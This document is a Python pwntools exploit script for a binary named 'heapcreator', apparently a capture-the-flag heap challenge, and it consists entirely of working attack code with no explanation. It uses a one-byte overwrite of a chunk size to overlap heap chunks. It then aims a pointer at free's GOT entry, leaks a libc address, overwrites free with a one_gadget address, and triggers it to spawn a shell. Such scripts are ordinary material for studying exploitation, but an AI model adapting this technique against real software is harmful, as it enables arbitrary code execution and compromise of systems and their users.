from pwn import *
context.log_level = "debug"
p = process("./heapcreator")
elf = ELF("./heapcreator")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

def cmd(choice):
	p.sendlineafter("choice :" , str(choice))

def add(size , content):
	cmd(1)
	p.sendlineafter("Heap : " , str(size))
	p.sendafter("Content of heap:" , content)

def edit(index , content):
	cmd(2)
	p.sendlineafter("Index :" , str(index))
	p.sendafter("Content of heap : " , content)

def show(index):
	cmd(3)
	p.sendlineafter("Index :" , str(index))
	p.recvuntil("\nContent : ")

	return p.recvuntil("\n" , drop = True)

def delete(index):
	cmd(4)
	p.sendlineafter("Index :" , str(index))

pad = "pad"
add(0x48 , pad) # 0x20 # 0x50 
add(0x48 , pad) # 0x20 # 0x50
add(0x48 , "a" * 0x10  + p64(0) + p64(0x21) + p64(0) * 2 + p64(0x0) + p64(0x21)) # 0x20 # 0x50

edit(0 , "a" * 0x48 + "\xb1") # 0x20 = > 0xb0
delete(1)

free_got = elf.got["free"]
payload = "a" * 0x40 # padding start at heaparray[1] + 0x20
payload += p64(0x0) + p64(0x21) + p64(0x48) + p64(free_got) 
add(0x80 , payload) # 0x80 = 0xb0 - 0x20 - 0x10 # 0x20 is heaparray[1] | split from unsorted bin
free_addr = u64(show(2).ljust(8 , "\x00"))
libc_base = free_addr - libc.sym["free"]
one_gadget = libc_base + 0xf02a4
edit(2 , p64(one_gadget))
delete(0)
p.interactive()